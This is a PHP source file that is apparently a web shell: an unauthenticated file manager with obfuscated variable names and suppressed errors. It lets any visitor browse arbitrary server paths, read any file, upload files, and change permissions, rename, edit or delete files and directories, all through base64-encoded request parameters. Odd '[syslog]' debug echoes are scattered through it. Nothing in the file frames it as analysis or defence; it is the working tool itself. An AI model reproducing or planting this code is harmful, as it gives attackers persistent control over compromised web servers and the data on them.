<?php
error_reporting(0); echo '[syslog]01
'; if (get_magic_quotes_gpc()) { foreach ($_POST as $sp7ac89e => $sp8e17b7) { $_POST[$sp7ac89e] = stripslashes($sp8e17b7); } } echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<title>2017Cocument.domain</title>
<style>
body{
    font-family: "Racing Sans One", cursive;
    background-color: #e6e6e6;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color: silver;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px #000000 dotted;
}
H1{
    font-family: "Rye", cursive;
}
a{
    color: #000;
    text-decoration: none;
}
a:hover{
    color: #fff;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : '; echo '[syslog]02
'; if (isset($_GET['path'])) { $sp149c6d = base64_decode($_GET['path']); } else { $sp149c6d = getcwd(); } $spd6bd35 = base64_encode($sp149c6d); $sp149c6d = str_replace('\\', '/', $sp149c6d); $sp9d1e45 = explode('/', $sp149c6d); foreach ($sp9d1e45 as $sp2ec0ef => $sp522278) { if ($sp522278 == '' && $sp2ec0ef == 0) { $spd09f64 = true; echo '<a href="?path=' . base64_encode('/') . '">/</a>'; continue; } if ($sp522278 == '') { continue; } echo '<a href="?path='; $spd6a33b = ''; for ($sp412bbc = 0; $sp412bbc <= $sp2ec0ef; $sp412bbc++) { $spd6a33b .= "{$sp9d1e45[$sp412bbc]}"; if ($sp412bbc != $sp2ec0ef) { $spd6a33b .= '/'; } } echo base64_encode($spd6a33b); echo '">' . $sp522278 . '</a>/'; } echo '</td></tr><tr><td>'; if (isset($_FILES['file'])) { if (copy($_FILES['file']['tmp_name'], $sp149c6d . '/' . $_FILES['file']['name'])) { echo '<font color="green">File Upload Done.</font><br />'; } else { echo '<font color="red">File Upload Error.</font><br />'; } } echo '[syslog]03
'; echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>'; if (isset($_GET['filesrc'])) { echo '<tr><td>Current File : '; echo base64_decode($_GET['filesrc']); echo '</tr></td></table><br />'; echo '<pre>' . htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))) . '</pre>'; } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') { echo '</table><br /><center>' . $_POST['path'] . '<br /><br />'; if ($_POST['opt'] == 'chmod') { if (isset($_POST['perm'])) { if (chmod($_POST['path'], $_POST['perm'])) { echo '<font color="green">Change Permission Done.</font><br />'; } else { echo '<font color="red">Change Permission Error.</font><br />'; } } echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
        <input type="hidden" name="path" value="' . $_POST['path'] . '">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>'; } elseif ($_POST['opt'] == 'rename') { if (isset($_POST['newname'])) { if (rename($_POST['path'], $sp149c6d . '/' . $_POST['newname'])) { echo '<font color="green">Change Name Done.</font><br />'; } else { echo '<font color="red">Change Name Error.</font><br />'; } $_POST['name'] = $_POST['newname']; } echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
        <input type="hidden" name="path" value="' . $_POST['path'] . '">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>'; } elseif ($_POST['opt'] == 'edit') { if (isset($_POST['src'])) { $spe0ea16 = fopen($_POST['path'], 'w'); if (fwrite($spe0ea16, $_POST['src'])) { echo '<font color="green">Edit File Done.</font><br />'; } else { echo '<font color="red">Edit File Error.</font><br />'; } fclose($spe0ea16); } echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
        <input type="hidden" name="path" value="' . $_POST['path'] . '">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>'; } echo '</center>'; } else { echo '</table><br /><center>'; if (isset($_GET['option']) && $_POST['opt'] == 'delete') { if ($_POST['type'] == 'dir') { if (rmdir($_POST['path'])) { echo '<font color="green">Delete Dir Done.</font><br />'; } else { echo '<font color="red">Delete Dir Error.</font><br />'; } } elseif ($_POST['type'] == 'file') { if (unlink($_POST['path'])) { echo '<font color="green">Delete File Done.</font><br />'; } else { echo '<font color="red">Delete File Error.</font><br />'; } } echo '[syslog]04
'; } echo '</center>'; $sp207a7b = scandir($sp149c6d); echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>'; foreach ($sp207a7b as $spee51b5) { if (!is_dir("{$sp149c6d}/{$spee51b5}") || $spee51b5 == '.' || $spee51b5 == '..') { continue; } $spe7e057 = base64_encode("{$sp149c6d}/{$spee51b5}"); echo "<tr>\r\n        <td><a href=\"?path={$spe7e057}\">{$spee51b5}</a></td>\r\n        <td><center>--</center></td>\r\n        <td><center>"; if (is_writable("{$sp149c6d}/{$spee51b5}")) { echo '<font color="green">'; } elseif (!is_readable("{$sp149c6d}/{$spee51b5}")) { echo '<font color="red">'; } echo perms("{$sp149c6d}/{$spee51b5}"); if (is_writable("{$sp149c6d}/{$spee51b5}") || !is_readable("{$sp149c6d}/{$spee51b5}")) { echo '</font>'; } echo "</center></td>\r\n        <td><center><form method=\"POST\" action=\"?option&path={$spd6bd35}\">\r\n        <select name=\"opt\">\r\n\t    <option value=\"\"></option>\r\n        <option value=\"delete\">Delete</option>\r\n        <option value=\"chmod\">Chmod</option>\r\n        <option value=\"rename\">Rename</option>\r\n        </select>\r\n        <input type=\"hidden\" name=\"type\" value=\"dir\">\r\n        <input type=\"hidden\" name=\"name\" value=\"{$spee51b5}\">\r\n        <input type=\"hidden\" name=\"path\" value=\"{$sp149c6d}/{$spee51b5}\">\r\n        <input type=\"submit\" value=\">\" />\r\n        </form></center></td>\r\n        </tr>"; } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; foreach ($sp207a7b as $sp7ff75d) { if (!is_file("{$sp149c6d}/{$sp7ff75d}")) { continue; } $spbb5bfd = filesize("{$sp149c6d}/{$sp7ff75d}") / 1024; $spbb5bfd = round($spbb5bfd, 3); if ($spbb5bfd >= 1024) { $spbb5bfd = round($spbb5bfd / 1024, 2) . ' MB'; } else { $spbb5bfd = $spbb5bfd . ' KB'; } $sp8a8d0d = base64_encode("{$sp149c6d}/{$sp7ff75d}"); echo "<tr>\r\n        <td><a href=\"?filesrc={$sp8a8d0d}&path={$spd6bd35}\">{$sp7ff75d}</a></td>\r\n        <td><center>" . $spbb5bfd . '</center></td>
        <td><center>'; if (is_writable("{$sp149c6d}/{$sp7ff75d}")) { echo '<font color="green">'; } elseif (!is_readable("{$sp149c6d}/{$sp7ff75d}")) { echo '<font color="red">'; } echo perms("{$sp149c6d}/{$sp7ff75d}"); if (is_writable("{$sp149c6d}/{$sp7ff75d}") || !is_readable("{$sp149c6d}/{$sp7ff75d}")) { echo '</font>'; } echo "</center></td>\r\n        <td><center><form method=\"POST\" action=\"?option&path={$spd6bd35}\">\r\n        <select name=\"opt\">\r\n\t    <option value=\"\"></option>\r\n        <option value=\"delete\">Delete</option>\r\n        <option value=\"chmod\">Chmod</option>\r\n        <option value=\"rename\">Rename</option>\r\n        <option value=\"edit\">Edit</option>\r\n        </select>\r\n        <input type=\"hidden\" name=\"type\" value=\"file\">\r\n        <input type=\"hidden\" name=\"name\" value=\"{$sp7ff75d}\">\r\n        <input type=\"hidden\" name=\"path\" value=\"{$sp149c6d}/{$sp7ff75d}\">\r\n        <input type=\"submit\" value=\">\" />\r\n        </form></center></td>\r\n        </tr>"; } echo '</table>
    </div>'; } echo '
</BODY>
</HTML>'; function perms($sp7ff75d) { $spce0b8c = @fileperms($sp7ff75d); echo '[syslog]05_f
'; if (($spce0b8c & 49152) == 49152) { $sp35a580 = 's'; } elseif (($spce0b8c & 40960) == 40960) { $sp35a580 = 'l'; } elseif (($spce0b8c & 32768) == 32768) { $sp35a580 = '-'; } elseif (($spce0b8c & 24576) == 24576) { $sp35a580 = 'b'; } elseif (($spce0b8c & 16384) == 16384) { $sp35a580 = 'd'; } elseif (($spce0b8c & 8192) == 8192) { $sp35a580 = 'c'; } elseif (($spce0b8c & 4096) == 4096) { $sp35a580 = 'p'; } else { $sp35a580 = 'u'; } $sp35a580 .= $spce0b8c & 256 ? 'r' : '-'; $sp35a580 .= $spce0b8c & 128 ? 'w' : '-'; $sp35a580 .= $spce0b8c & 64 ? $spce0b8c & 2048 ? 's' : 'x' : ($spce0b8c & 2048 ? 'S' : '-'); $sp35a580 .= $spce0b8c & 32 ? 'r' : '-'; $sp35a580 .= $spce0b8c & 16 ? 'w' : '-'; $sp35a580 .= $spce0b8c & 8 ? $spce0b8c & 1024 ? 's' : 'x' : ($spce0b8c & 1024 ? 'S' : '-'); $sp35a580 .= $spce0b8c & 4 ? 'r' : '-'; $sp35a580 .= $spce0b8c & 2 ? 'w' : '-'; $sp35a580 .= $spce0b8c & 1 ? $spce0b8c & 512 ? 't' : 'x' : ($spce0b8c & 512 ? 'T' : '-'); return $sp35a580; } echo '[syslog]06
';